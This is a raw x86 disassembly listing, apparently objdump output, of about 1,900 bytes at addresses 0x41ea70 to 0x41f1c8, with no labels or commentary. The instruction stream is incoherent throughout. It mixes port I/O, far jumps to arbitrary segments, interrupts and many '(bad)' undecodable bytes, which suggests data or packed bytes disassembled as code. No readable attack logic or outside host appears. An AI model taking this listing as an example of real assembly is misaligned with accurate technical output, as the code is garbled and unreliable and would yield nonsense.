  41ea70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea71:	push   eax
  41ea72:	inc    edx
  41ea73:	dec    DWORD PTR [esi-0x47]
  41ea76:	stos   BYTE PTR es:[edi],al
  41ea77:	repnz pop ebx
  41ea79:	dec    edx
  41ea7a:	inc    ebp
  41ea7b:	inc    esp
  41ea7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea7d:	fs arpl sp,ax
  41ea80:	aas    
  41ea81:	mov    ah,0x10
  41ea83:	add    ecx,DWORD PTR [ebp+ebp*1+0x37]
  41ea87:	ins    DWORD PTR es:[edi],dx
  41ea88:	jmp    FWORD PTR [esi+eiz*8]
  41ea8b:	loopne 0x41eaed
  41ea8d:	mov    ds,WORD PTR [ebx]
  41ea8f:	mov    esi,0xd88a78e9
  41ea94:	add    al,BYTE PTR [ebx-0x15]
  41ea97:	add    BYTE PTR [ecx+0x6ff5ca60],ah
  41ea9d:	inc    eax
  41ea9e:	mov    edi,0x6549b13c
  41eaa3:	popf   
  41eaa4:	push   es
  41eaa5:	sub    DWORD PTR [eax-0x25],esi
  41eaa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaa9:	dec    esp
  41eaaa:	add    BYTE PTR ds:0x4c5e5782,bh
  41eab0:	mov    edi,DWORD PTR [ebx+0xb4c15f9]
  41eab6:	mov    ah,0x4d
  41eab8:	push   ecx
  41eab9:	arpl   WORD PTR [esp+esi*8+0x7c950571],ax
  41eac0:	inc    esi
  41eac1:	push   eax
  41eac2:	in     al,0x83
  41eac4:	pop    edx
  41eac5:	enter  0xe933,0x15
  41eac9:	mov    ch,BYTE PTR [ebx]
  41eacb:	sub    DWORD PTR [eax+0x61],0xffffffb0
  41eacf:	outs   dx,BYTE PTR cs:[esi]
  41ead1:	sahf   
  41ead2:	call   0x77f6:0x84f14453
  41ead9:	and    esi,0xffffffcf
  41eadc:	jns    0x41eb35
  41eade:	mov    eax,0x236d5d34
  41eae3:	adc    cl,dh
  41eae5:	or     BYTE PTR [edx],al
  41eae7:	dec    edi
  41eae8:	fcmovb st,st(1)
  41eaea:	out    0xd1,eax
  41eaec:	in     eax,0xf6
  41eaee:	mov    ecx,eax
  41eaf0:	mov    ecx,DWORD PTR [edi+0x354ecac9]
  41eaf6:	iret   
  41eaf7:	push   esp
  41eaf8:	and    ebp,DWORD PTR [esi+0x54]
  41eafb:	retf   0x2d3a
  41eafe:	mov    ch,0xe7
  41eb00:	mov    esp,gs
  41eb02:	xchg   ebp,eax
  41eb03:	std    
  41eb04:	rcr    ebx,0x72
  41eb07:	xchg   edi,eax
  41eb08:	popaw  
  41eb0a:	sar    BYTE PTR [ecx-0x3c47f81d],0xb8
  41eb11:	add    eax,0x790221f9
  41eb16:	mov    ds:0x465fe954,al
  41eb1b:	pop    esi
  41eb1c:	pop    ds
  41eb1d:	aaa    
  41eb1e:	cmp    BYTE PTR [eax-0x29],ch
  41eb21:	add    eax,0x36900376
  41eb26:	scas   al,BYTE PTR es:[edi]
  41eb27:	push   0xbbed84dd
  41eb2c:	add    DWORD PTR [ecx+eax*2],edx
  41eb2f:	mov    edx,0x4caa4d17
  41eb34:	pop    edx
  41eb35:	inc    eax
  41eb36:	or     BYTE PTR ds:0xa74dd7ac,ch
  41eb3c:	scas   al,BYTE PTR es:[edi]
  41eb3d:	loop   0x41eb6b
  41eb3f:	sahf   
  41eb40:	ds xor cl,bl
  41eb43:	inc    eax
  41eb44:	arpl   si,di
  41eb46:	mov    eax,ds:0xd7164939
  41eb4b:	push   ebx
  41eb4c:	pop    ecx
  41eb4d:	push   ebx
  41eb4e:	ins    DWORD PTR es:[edi],dx
  41eb4f:	pslld  mm7,QWORD PTR [ecx+0x5e]
  41eb53:	test   al,0xc8
  41eb55:	fwait
  41eb56:	inc    ebp
  41eb57:	(bad)  
  41eb58:	loop   0x41eb20
  41eb5a:	mov    ds:0x86889f75,eax
  41eb5f:	les    ecx,FWORD PTR [edx-0x36cfabf3]
  41eb65:	fcomp  DWORD PTR [edx-0x17649130]
  41eb6b:	aad    0xd4
  41eb6d:	outs   dx,DWORD PTR ds:[esi]
  41eb6e:	ja     0x41ebe4
  41eb70:	pop    es
  41eb71:	adc    BYTE PTR [esp+ecx*2-0x6a],0xb9
  41eb76:	test   DWORD PTR [eax+0x35c4ef26],edx
  41eb7c:	sbb    bl,BYTE PTR [edx]
  41eb7e:	in     al,dx
  41eb7f:	out    0x38,al
  41eb81:	jmp    0x41eb5f
  41eb83:	mov    esi,0x651224e5
  41eb88:	into   
  41eb89:	inc    eax
  41eb8a:	jb     0x41eb15
  41eb8c:	adc    eax,0x862c9de3
  41eb91:	pop    esi
  41eb92:	test   eax,0x76a9eee0
  41eb97:	adc    cl,BYTE PTR [ebx-0x163825f1]
  41eb9d:	dec    esi
  41eb9e:	or     al,0xca
  41eba0:	mov    bl,0xf9
  41eba2:	shr    DWORD PTR [esi-0x69],0x21
  41eba6:	ss sbb eax,0xd6209431
  41ebac:	mov    al,0x81
  41ebae:	lds    edx,FWORD PTR [ebp+0x57b56437]
  41ebb4:	push   0xc3466f46
  41ebb9:	les    ebp,FWORD PTR ds:[eax+eax*1+0x2fb6b49f]
  41ebc1:	shl    dl,0xd4
  41ebc4:	xchg   ebp,eax
  41ebc5:	loope  0x41eb99
  41ebc7:	dec    esp
  41ebc8:	cli    
  41ebc9:	cwde   
  41ebca:	std    
  41ebcb:	icebp  
  41ebcc:	jg     0x41eb4f
  41ebce:	pop    esp
  41ebcf:	xchg   esp,eax
  41ebd0:	xchg   edx,eax
  41ebd1:	fnstcw WORD PTR [esi]
  41ebd3:	inc    ecx
  41ebd4:	push   ss
  41ebd5:	pop    fs
  41ebd7:	jge    0x41ebd8
  41ebd9:	fcomi  st,st(1)
  41ebdb:	cs jmp 0x8304bf1d
  41ebe1:	addr16 repz in eax,dx
  41ebe4:	ja     0x41ec62
  41ebe6:	mov    ds:0xaa5c01,al
  41ebeb:	cmp    dh,dl
  41ebed:	cmp    ah,BYTE PTR [esi+edi*8]
  41ebf0:	in     al,dx
  41ebf1:	fimul  WORD PTR ds:[edi-0xa53942b]
  41ebf8:	inc    ecx
  41ebf9:	mov    eax,ds:0x1baf313
  41ebfe:	add    bh,ah
  41ec00:	add    DWORD PTR [eax],eax
  41ec02:	add    BYTE PTR [ebx+0xc4ac64c],ah
  41ec08:	rcl    DWORD PTR [ecx-0x75],1
  41ec0b:	xor    al,0x25
  41ec0d:	cmp    ah,BYTE PTR [ecx]
  41ec0f:	jp     0x41ec79
  41ec11:	mov    cl,0x88
  41ec13:	loope  0x41eba3
  41ec15:	lods   al,BYTE PTR ds:[esi]
  41ec16:	jge    0x41ebde
  41ec18:	scas   al,BYTE PTR es:[edi]
  41ec19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec1a:	ins    BYTE PTR es:[edi],dx
  41ec1b:	mov    edx,0x515a2c14
  41ec20:	pop    ebp
  41ec21:	(bad)  
  41ec22:	fdiv   st(2),st
  41ec24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec25:	inc    edi
  41ec26:	retf   
  41ec27:	or     eax,0x386970bc
  41ec2c:	mov    ?,WORD PTR [ebx+0x5b2010bd]
  41ec32:	es push 0xffffffc1
  41ec35:	xor    ecx,DWORD PTR [edi]
  41ec37:	xchg   DWORD PTR [esp+ebp*8-0x22],ebx
  41ec3b:	ins    BYTE PTR es:[edi],dx
  41ec3c:	sti    
  41ec3d:	and    dl,cl
  41ec3f:	push   edi
  41ec40:	ret    
  41ec41:	nop
  41ec42:	xchg   ebp,eax
  41ec43:	cli    
  41ec44:	loop   0x41ecc3
  41ec46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec47:	and    BYTE PTR [esi+0x42],dl
  41ec4a:	xor    ch,al
  41ec4c:	and    al,0x94
  41ec4e:	lods   eax,DWORD PTR ds:[esi]
  41ec4f:	jecxz  0x41ec55
  41ec51:	jnp    0x41ec2e
  41ec53:	mov    WORD PTR [ebp+0x10],ds
  41ec56:	inc    eax
  41ec57:	ficom  WORD PTR [esp+edi*2-0x3ab99c49]
  41ec5e:	xchg   esp,eax
  41ec5f:	call   0x607199b0
  41ec64:	and    ch,BYTE PTR [eax]
  41ec66:	stc    
  41ec67:	mov    eax,DWORD PTR [ecx+0x43082fb3]
  41ec6d:	mov    bh,BYTE PTR ds:[eax]
  41ec70:	sub    bh,BYTE PTR [esi]
  41ec72:	jns    0x41ecc7
  41ec74:	fs test al,0x7c
  41ec77:	and    al,0xf6
  41ec79:	inc    edi
  41ec7a:	sub    ebp,DWORD PTR [esi+0x5f7119d1]
  41ec80:	push   ss
  41ec81:	inc    ebx
  41ec82:	ror    DWORD PTR [ecx+0x5f],1
  41ec85:	lea    ecx,[ebx-0x1d0f1cf5]
  41ec8b:	lods   eax,DWORD PTR ds:[esi]
  41ec8c:	or     BYTE PTR [ecx],dh
  41ec8e:	jns    0x41ec5c
  41ec90:	jne    0x41ec3c
  41ec92:	(bad)  
  41ec93:	fild   WORD PTR [edi-0x63]
  41ec96:	add    al,0x40
  41ec98:	mov    eax,ds:0x21b60fb9
  41ec9d:	xchg   BYTE PTR [edx+0x51],ch
  41eca0:	(bad)  
  41eca2:	jp     0x41ed18
  41eca4:	jle    0x41ecb2
  41eca6:	bound  eax,QWORD PTR [eax-0x23b0f0b1]
  41ecac:	push   0xffffffe8
  41ecae:	in     eax,dx
  41ecaf:	mov    eax,ds:0x514aa356
  41ecb4:	sar    BYTE PTR [esp+ebx*1+0x3cf35855],1
  41ecbb:	shl    DWORD PTR [ecx],1
  41ecbd:	mov    dl,0x6f
  41ecbf:	test   BYTE PTR ds:0xf46adf13,al
  41ecc5:	add    al,0xb8
  41ecc7:	ins    BYTE PTR es:[edi],dx
  41ecc8:	mov    ch,0x3
  41ecca:	mov    ds:0xdf03d8f0,eax
  41eccf:	(bad)  
  41ecd0:	jbe    0x41eca1
  41ecd2:	mov    esp,0x3938a567
  41ecd7:	pop    edi
  41ecd8:	mov    BYTE PTR [eax],ah
  41ecda:	mov    ecx,0x5f6d53d4
  41ecdf:	inc    ebx
  41ece0:	inc    ecx
  41ece1:	mov    edx,DWORD PTR [ebx+0x6fefbe42]
  41ece7:	arpl   WORD PTR [edx-0x68],si
  41ecea:	ficom  DWORD PTR [ebp-0x157398cf]
  41ecf0:	sahf   
  41ecf1:	leave  
  41ecf2:	xchg   esi,eax
  41ecf3:	ret    
  41ecf4:	ds jb  0x41ecf3
  41ecf7:	les    ebp,FWORD PTR es:[edx-0x5a59e4a4]
  41ecfe:	add    ebp,DWORD PTR [eax]
  41ed00:	cmp    al,0x9c
  41ed02:	popa   
  41ed03:	xchg   ebx,eax
  41ed04:	in     eax,dx
  41ed05:	jle    0x41ed7f
  41ed07:	inc    eax
  41ed08:	inc    esi
  41ed09:	(bad)
  41ed0e:	lods   eax,DWORD PTR ds:[esi]
  41ed0f:	and    eax,0xb5915cce
  41ed14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed15:	inc    edi
  41ed16:	or     dh,BYTE PTR ds:0x8872dcbe
  41ed1c:	mov    eax,0x75a5ff51
  41ed21:	push   0xffffffae
  41ed23:	stos   DWORD PTR es:[edi],eax
  41ed24:	jmp    0x41eced
  41ed26:	jno    0x41ecea
  41ed28:	sbb    esi,ebx
  41ed2a:	adc    bh,BYTE PTR [eax+edx*4-0x2e660e58]
  41ed31:	dec    ecx
  41ed32:	loop   0x41ed00
  41ed34:	or     ch,ch
  41ed36:	fwait
  41ed37:	sub    BYTE PTR [edx+ebp*1],0x7d
  41ed3b:	xchg   ebp,eax
  41ed3c:	lods   al,BYTE PTR ds:[esi]
  41ed3d:	fild   QWORD PTR [edx+0x14c78adc]
  41ed43:	sub    al,0xb9
  41ed45:	test   BYTE PTR [esp+ebx*4],ch
  41ed48:	inc    esi
  41ed49:	clc    
  41ed4a:	push   ss
  41ed4b:	pop    ss
  41ed4c:	jmp    0xa5e1:0x65789527
  41ed53:	pop    eax
  41ed54:	call   0xe854e580
  41ed59:	mov    ch,0x2e
  41ed5b:	mov    cl,0x75
  41ed5d:	jbe    0x41ecfd
  41ed5f:	sub    esp,DWORD PTR [edi+0x40]
  41ed62:	or     BYTE PTR [ebp+0x205961bf],dh
  41ed68:	add    eax,0x4739f9c4
  41ed6d:	ror    BYTE PTR [eax+0x27595f8e],cl
  41ed73:	dec    ebx
  41ed74:	xlat   BYTE PTR ds:[ebx]
  41ed75:	mov    al,0xa2
  41ed77:	dec    ebp
  41ed78:	push   eax
  41ed79:	stos   DWORD PTR es:[edi],eax
  41ed7a:	push   es
  41ed7b:	cmp    eax,0xcd8dc6de
  41ed80:	mov    bl,0x9f
  41ed82:	dec    DWORD PTR [eax+edx*1]
  41ed85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed86:	je     0x41ed0b
  41ed88:	(bad)
  41ed8c:	push   0xffffffa8
  41ed8e:	outs   dx,DWORD PTR ds:[esi]
  41ed8f:	aas    
  41ed90:	mov    ch,0x9b
  41ed92:	pop    es
  41ed93:	dec    ebp
  41ed94:	mov    al,dh
  41ed96:	and    edx,DWORD PTR [edx+0x45]
  41ed99:	sahf   
  41ed9a:	pop    esi
  41ed9b:	xchg   ebp,eax
  41ed9c:	dec    ecx
  41ed9d:	xor    dl,BYTE PTR [ebx+eax*8-0x215ad8de]
  41eda4:	jle    0x41ee21
  41eda6:	jae    0x41ed95
  41eda8:	cmp    DWORD PTR [edx+eiz*1+0x4d1acf5f],edx
  41edaf:	rcl    DWORD PTR [esi],cl
  41edb1:	repz leave 
  41edb3:	push   eax
  41edb4:	jmp    0xf0dc:0x6230924b
  41edbb:	les    edi,FWORD PTR ds:0xc4b195b8
  41edc1:	sub    eax,0xbf1957f4
  41edc6:	mov    dl,0x63
  41edc8:	jmp    0xd834:0xe4b7285d
  41edcf:	and    ebx,DWORD PTR [esi]
  41edd1:	inc    edi
  41edd2:	ret    0xf58f
  41edd5:	lea    esp,[ebx+0x7b3a581d]
  41eddb:	cmp    ecx,DWORD PTR [eax]
  41eddd:	jne    0x41ed75
  41eddf:	sbb    DWORD PTR [edi+0x2c],edi
  41ede2:	dec    edi
  41ede3:	addr16 int3 
  41ede5:	mov    dl,0xba
  41ede7:	pop    ebp
  41ede8:	add    BYTE PTR [ebx],0x0
  41edeb:	fnstenv [esi-0x2490e49a]
  41edf1:	std    
  41edf2:	neg    BYTE PTR [esi]
  41edf4:	sub    esp,DWORD PTR [ebx-0x23]
  41edf7:	lods   eax,DWORD PTR ds:[esi]
  41edf8:	or     BYTE PTR [ecx],cl
  41edfa:	push   edx
  41edfb:	fidivr DWORD PTR [ecx+eax*1+0x1e700]
  41ee02:	add    BYTE PTR [edx],bh
  41ee04:	xchg   esp,eax
  41ee05:	scas   al,BYTE PTR es:[edi]
  41ee06:	mov    edx,0x78bed27
  41ee0b:	(bad)  
  41ee0c:	aam    0xc0
  41ee0e:	std    
  41ee0f:	or     eax,0x67d46aa8
  41ee14:	int    0xcc
  41ee16:	mov    BYTE PTR [ecx],dl
  41ee18:	sub    eax,0x9b307ad7
  41ee1d:	retf   
  41ee1e:	xor    eax,0x10e2d938
  41ee23:	call   0xb4ed:0x4091581c
  41ee2a:	mov    ebp,0xccf9b8ad
  41ee2f:	popf   
  41ee30:	(bad)  
  41ee31:	xor    eax,DWORD PTR [edx-0x55feb781]
  41ee37:	dec    ebx
  41ee38:	xor    BYTE PTR [ecx],ah
  41ee3a:	mov    ds:0xd940f253,eax
  41ee3f:	(bad)  
  41ee40:	out    0xeb,al
  41ee42:	ins    DWORD PTR es:[edi],dx
  41ee43:	jno    0x41ee63
  41ee45:	xchg   esp,eax
  41ee46:	hlt    
  41ee47:	cwde   
  41ee48:	cmp    BYTE PTR [ebx+0x4d],bh
  41ee4b:	inc    ebx
  41ee4c:	adc    DWORD PTR [edx+0x4f],edi
  41ee4f:	xchg   edx,eax
  41ee50:	xchg   ecx,eax
  41ee51:	ss lock std 
  41ee54:	int3   
  41ee55:	arpl   WORD PTR [eax-0x4d],ax
  41ee58:	xchg   esp,eax
  41ee59:	or     ebp,DWORD PTR [ecx]
  41ee5b:	adc    al,BYTE PTR [eax-0x1d4a8667]
  41ee61:	std    
  41ee62:	xor    edi,DWORD PTR [eiz*4-0x4ba77a3a]
  41ee69:	in     eax,0x9b
  41ee6b:	sahf   
  41ee6c:	mov    ds:0x29702459,eax
  41ee71:	lock or bl,BYTE PTR [eax-0x20bbf8b4]
  41ee78:	loopne 0x41eeca
  41ee7a:	xor    BYTE PTR [ebx-0x8],ah
  41ee7d:	cwde   
  41ee7e:	jl     0x41ee38
  41ee80:	test   al,0x1f
  41ee82:	push   ebp
  41ee83:	mov    dh,0x93
  41ee85:	dec    edx
  41ee86:	sbb    esi,DWORD PTR [ebx]
  41ee88:	popa   
  41ee89:	push   cs
  41ee8a:	dec    edx
  41ee8b:	test   eax,0x7d99379d
  41ee90:	xor    DWORD PTR [ebx+esi*1],ecx
  41ee93:	scas   eax,DWORD PTR es:[edi]
  41ee94:	jno    0x41eed4
  41ee96:	xchg   DWORD PTR [esi+0x2b],esi
  41ee99:	inc    ecx
  41ee9a:	mov    ecx,eax
  41ee9c:	retf   
  41ee9d:	aas    
  41ee9e:	sbb    DWORD PTR [edx],0x67db9818
  41eea4:	pop    ecx
  41eea5:	in     al,dx
  41eea6:	sti    
  41eea7:	aaa    
  41eea8:	xor    ebx,ebx
  41eeaa:	in     al,0x9
  41eeac:	jae    0x41ef03
  41eeae:	jno    0x41eed0
  41eeb0:	test   BYTE PTR [ebx],bl
  41eeb2:	inc    esi
  41eeb3:	add    edi,ebx
  41eeb5:	ds lock push edi
  41eeb8:	jge    0x41eeb2
  41eeba:	ja     0x41eedd
  41eebc:	pop    ebp
  41eebd:	lock mov al,ds:0xcce6807a
  41eec3:	sub    al,0x9
  41eec5:	in     al,0x1c
  41eec7:	mov    ds:0x7d4aceb8,eax
  41eecc:	das    
  41eecd:	mov    dl,0xf0
  41eecf:	mov    esi,0x55b010a8
  41eed4:	jb     0x41eec0
  41eed6:	mov    dh,0x63
  41eed8:	push   0x4e
  41eeda:	mov    cl,0x4f
  41eedc:	inc    ebx
  41eedd:	push   edi
  41eede:	mov    DWORD PTR [ebx-0x7],edx
  41eee1:	into   
  41eee2:	or     BYTE PTR [esi],al
  41eee4:	rcr    dh,1
  41eee6:	push   ebp
  41eee7:	inc    ebp
  41eee8:	or     bh,BYTE PTR [ecx-0x185fa388]
  41eeee:	jle    0x41ef1c
  41eef0:	adc    ebx,DWORD PTR [esi]
  41eef2:	out    0xec,eax
  41eef4:	cmp    al,0x3d
  41eef6:	aam    0xa2
  41eef8:	push   esi
  41eef9:	es cs int3 
  41eefc:	mov    ebx,0x8289e070
  41ef01:	sbb    BYTE PTR [edi+0x3ca6837c],dh
  41ef07:	ret    0x5bf4
  41ef0a:	sbb    al,0xcf
  41ef0c:	imul   ebp,DWORD PTR [esi],0xfa2a4fce
  41ef12:	repnz xor eax,0xd34b2e15
  41ef18:	iret   
  41ef19:	in     al,0xef
  41ef1b:	add    DWORD PTR [edi+0x42c092aa],ebx
  41ef21:	pop    ss
  41ef22:	clc    
  41ef23:	in     al,dx
  41ef24:	lock jp 0x41ef99
  41ef27:	shl    edi,cl
  41ef29:	inc    edx
  41ef2a:	cmc    
  41ef2b:	push   0xffffff82
  41ef2d:	pop    edi
  41ef2e:	hlt    
  41ef2f:	mov    bh,0x10
  41ef31:	xchg   edi,eax
  41ef32:	adc    BYTE PTR [ebx-0x6],al
  41ef35:	xor    eax,0x992233dc
  41ef3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef3b:	mov    ebx,0x47c04f97
  41ef40:	add    ebx,DWORD PTR [eax]
  41ef42:	xor    esp,DWORD PTR [ecx]
  41ef44:	vhaddpd xmm5,xmm1,XMMWORD PTR [ecx]
  41ef48:	add    bh,dl
  41ef4a:	sti    
  41ef4b:	cld    
  41ef4c:	(bad)  
  41ef4e:	adc    al,0xe3
  41ef50:	mov    dh,0xb1
  41ef52:	lods   al,BYTE PTR ds:[esi]
  41ef53:	(bad)  
  41ef54:	xchg   ebp,eax
  41ef55:	in     al,0x4f
  41ef57:	pop    ebp
  41ef58:	ss mov al,ss:0x10e8478e
  41ef5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef60:	cwde   
  41ef61:	push   edx
  41ef62:	test   BYTE PTR [eax],ah
  41ef64:	shl    al,cl
  41ef66:	ds retf 0xbd68
  41ef6a:	test   DWORD PTR [eax+0x7f],edx
  41ef6d:	out    dx,al
  41ef6e:	(bad)  
  41ef72:	loopne 0x41efc3
  41ef74:	test   BYTE PTR [edi-0x5b],ah
  41ef77:	add    bl,BYTE PTR [eax-0x68d4dc32]
  41ef7d:	inc    ebx
  41ef7e:	dec    esp
  41ef7f:	retf   0xdfd
  41ef82:	mov    esp,0xe3e491e6
  41ef87:	jne    0x41ef75
  41ef89:	push   ebx
  41ef8a:	dec    ecx
  41ef8b:	pmaxub mm1,QWORD PTR [ecx+0x12]
  41ef8f:	cdq    
  41ef90:	dec    esp
  41ef91:	or     eax,0x956b655b
  41ef96:	lea    ebx,[eax]
  41ef98:	cmc    
  41ef99:	and    dh,bh
  41ef9b:	jb     0x41ef6f
  41ef9d:	shr    cl,0x26
  41efa0:	cmp    DWORD PTR ds:0xd8f835b2,ebp
  41efa6:	jmp    0x41efb8
  41efa8:	ror    DWORD PTR [eax],cl
  41efaa:	sub    edx,esp
  41efac:	jmp    0xa7d6:0xe243eedc
  41efb3:	inc    edi
  41efb4:	aas    
  41efb5:	adc    BYTE PTR [esi-0xb55e3f],0xe2
  41efbc:	mov    al,ds:0xee3e519a
  41efc1:	loopne 0x41ef6b
  41efc3:	leave  
  41efc4:	jmp    0xd437:0xea08b726
  41efcb:	pop    ss
  41efcc:	adc    dh,BYTE PTR [eax+0x16]
  41efcf:	dec    ecx
  41efd0:	jno    0x41ef5f
  41efd2:	jle    0x41efa3
  41efd4:	sbb    BYTE PTR [ebp-0x70],bh
  41efd7:	mov    ds:0x36bdd81,al
  41efdc:	inc    ecx
  41efdd:	les    ebx,FWORD PTR [ebx+ecx*4-0x23]
  41efe1:	sub    DWORD PTR ds:0xf7b2ec3e,0xe75220
  41efeb:	fidiv  DWORD PTR [edx]
  41efed:	xchg   edi,eax
  41efee:	mov    bh,bh
  41eff0:	scas   eax,DWORD PTR es:[edi]
  41eff1:	fbstp  TBYTE PTR [edx+0x3]
  41eff4:	inc    ebp
  41eff5:	mov    ds:0xaa7c355c,eax
  41effa:	adc    al,0xc1
  41effc:	mov    esi,0x1e70001
  41f001:	add    BYTE PTR [eax],al
  41f003:	repnz cmp al,0x2f
  41f006:	jae    0x41f019
  41f008:	ins    BYTE PTR es:[edi],dx
  41f009:	mov    cs,WORD PTR [esi+0x31]
  41f00c:	adc    DWORD PTR [ebx-0x6e800242],esi
  41f012:	daa    
  41f013:	iret   
  41f014:	mov    cl,0x39
  41f016:	pop    eax
  41f017:	aam    0xd6
  41f019:	ret    0xdfd8
  41f01c:	cmc    
  41f01d:	jo     0x41efa7
  41f01f:	cwde   
  41f020:	enter  0x4daa,0x40
  41f024:	not    DWORD PTR [edi]
  41f026:	shl    BYTE PTR [edi-0x3e1fe046],0xfb
  41f02d:	addr16 das 
  41f02f:	push   ebp
  41f030:	neg    DWORD PTR [eax*1-0x3448be3d]
  41f037:	push   edi
  41f038:	arpl   bp,bx
  41f03a:	dec    esi
  41f03b:	(bad)  
  41f03c:	pop    eax
  41f03d:	in     al,dx
  41f03e:	loop   0x41f04c
  41f040:	popa   
  41f041:	scas   al,BYTE PTR es:[edi]
  41f042:	push   eax
  41f043:	je     0x41f085
  41f045:	fwait
  41f046:	arpl   WORD PTR [eax],di
  41f048:	dec    edx
  41f049:	rcl    BYTE PTR [ebx+0x49],0x74
  41f04d:	mov    ebp,0x6b1404ce
  41f052:	xchg   al,al
  41f054:	sbb    eax,0xb1cce702
  41f059:	jecxz  0x41f014
  41f05b:	aam    0xf7
  41f05d:	retf   0xe38d
  41f060:	cmc    
  41f061:	mov    DWORD PTR [ebx],esi
  41f063:	ret    
  41f064:	inc    esp
  41f065:	ret    
  41f066:	ins    DWORD PTR es:[edi],dx
  41f067:	sub    esp,DWORD PTR [edi]
  41f069:	std    
  41f06a:	push   edx
  41f06b:	outs   dx,BYTE PTR ds:[esi]
  41f06c:	dec    edi
  41f06d:	push   ebx
  41f06e:	dec    eax
  41f06f:	call   0x397344c3
  41f074:	or     DWORD PTR [edi-0x4b3cbbdd],eax
  41f07a:	and    cl,BYTE PTR [edx+0x66b70395]
  41f080:	or     edx,DWORD PTR [edi]
  41f082:	call   0xb95e:0xfdb472bf
  41f089:	dec    ebp
  41f08a:	mov    DWORD PTR [ecx-0x2a],edx
  41f08d:	test   DWORD PTR [ebp-0x16c79411],0xc3321392
  41f097:	add    eax,ecx
  41f099:	dec    eax
  41f09a:	add    esp,DWORD PTR [esi+0x73d239dd]
  41f0a0:	push   cs
  41f0a1:	out    dx,eax
  41f0a2:	in     al,0xe4
  41f0a4:	das    
  41f0a5:	nop
  41f0a6:	inc    ebp
  41f0a7:	inc    BYTE PTR ds:0x7ae5726f
  41f0ad:	adc    eax,0x50566470
  41f0b2:	xor    dh,BYTE PTR [edi+0x7a25138d]
  41f0b8:	out    0x16,eax
  41f0ba:	std    
  41f0bb:	nop
  41f0bc:	fcom   DWORD PTR [eax-0x1f5e1a]
  41f0c2:	cmp    BYTE PTR [ecx],al
  41f0c4:	mov    eax,0xe64479da
  41f0c9:	jg     0x41f109
  41f0cb:	jno    0x41f146
  41f0cd:	mov    ch,0xb
  41f0cf:	xor    BYTE PTR [ebp+0x47],bl
  41f0d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0d3:	pop    esp
  41f0d4:	sbb    BYTE PTR [ebx+0x6a54a31e],cl
  41f0da:	ss out dx,eax
  41f0dc:	sub    al,0x5d
  41f0de:	mov    ebx,0xac1ed89e
  41f0e3:	test   eax,0x6c3996bf
  41f0e8:	jmp    0x41f0e5
  41f0ea:	scas   eax,DWORD PTR es:[edi]
  41f0eb:	mov    ebx,0x70c1f19b
  41f0f0:	iret   
  41f0f1:	mov    al,gs:0xcc5c42da
  41f0f7:	mov    ds:0x4eb08dec,eax
  41f0fc:	inc    ecx
  41f0fd:	in     eax,0xe1
  41f0ff:	mov    al,ds:0x6f21e1f0
  41f104:	mov    edi,0x8af16c0d
  41f109:	aaa    
  41f10a:	add    al,0x47
  41f10c:	icebp  
  41f10d:	das    
  41f10e:	cmp    ah,bh
  41f110:	and    BYTE PTR [edx+0x658e9a03],bl
  41f116:	sti    
  41f117:	pusha  
  41f118:	dec    edi
  41f119:	out    0x66,eax
  41f11b:	inc    edi
  41f11c:	ins    DWORD PTR es:[edi],dx
  41f11d:	jbe    0x41f178
  41f11f:	push   cs
  41f120:	mov    al,0xa8
  41f122:	push   ebx
  41f123:	xchg   ebp,eax
  41f124:	mov    edi,0x8678e509
  41f129:	push   edx
  41f12a:	gs aad 0x79
  41f12d:	addr16 sti 
  41f12f:	sbb    DWORD PTR [ebp-0x3a23e161],edi
  41f135:	sar    ebp,cl
  41f137:	adc    esp,DWORD PTR [edi-0x59]
  41f13a:	js     0x41f152
  41f13c:	fstp   TBYTE PTR [ebx+0x15]
  41f13f:	push   edx
  41f140:	sbb    cl,BYTE PTR [edi+ebx*2+0x49]
  41f144:	xchg   esi,eax
  41f145:	or     DWORD PTR [ecx+0x131c2bb3],esi
  41f14b:	push   ecx
  41f14c:	imul   ebp,DWORD PTR [edi+0x4ea71723],0xffffff80
  41f153:	push   0x6955b663
  41f158:	test   al,0x49
  41f15a:	mov    eax,ds:0x55fc8899
  41f15f:	ret    
  41f160:	ficomp DWORD PTR [ebx-0x19]
  41f163:	push   ds
  41f164:	push   0xffffffe7
  41f166:	add    eax,0x57d3dd21
  41f16b:	jp     0x41f1e1
  41f16d:	add    DWORD PTR [edi-0x7daa92ed],esp
  41f173:	dec    DWORD PTR ss:[ebp+0x7430b261]
  41f17a:	pop    edx
  41f17b:	int    0x13
  41f17d:	dec    ebx
  41f17e:	inc    esi
  41f17f:	or     eax,0xcb44d942
  41f184:	leave  
  41f185:	inc    bh
  41f187:	repz call 0x69d1cca3
  41f18d:	and    al,0x9b
  41f18f:	pop    ebp
  41f190:	addr16 adc ecx,esp
  41f193:	xchg   esi,eax
  41f194:	arpl   WORD PTR [ecx],bp
  41f196:	sub    ecx,DWORD PTR [esi-0x56]
  41f199:	ret    0x548d
  41f19c:	hlt    
  41f19d:	lods   al,BYTE PTR ds:[esi]
  41f19e:	adc    DWORD PTR ds:0xdbdad6a1,edx
  41f1a4:	add    ecx,DWORD PTR [esi]
  41f1a6:	sbb    al,BYTE PTR [esi+0xad74f61]
  41f1ac:	inc    esp
  41f1ad:	xchg   DWORD PTR [eax+0x34],ecx
  41f1b0:	fdiv   QWORD PTR [eax]
  41f1b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1b3:	cwde   
  41f1b4:	sub    esi,DWORD PTR [ebx]
  41f1b6:	or     al,BYTE PTR [esi-0x4]
  41f1b9:	jle    0x41f159
  41f1bb:	push   0xffffffa7
  41f1bd:	adc    eax,0x636b7a14
  41f1c2:	and    DWORD PTR [ebx],ebx
  41f1c4:	out    dx,al
  41f1c5:	xlat   BYTE PTR ds:[ebx]
  41f1c6:	(bad)  
  41f1c7:	pop    ecx
  41f1c8:	stos   BYTE PTR es:[edi],al
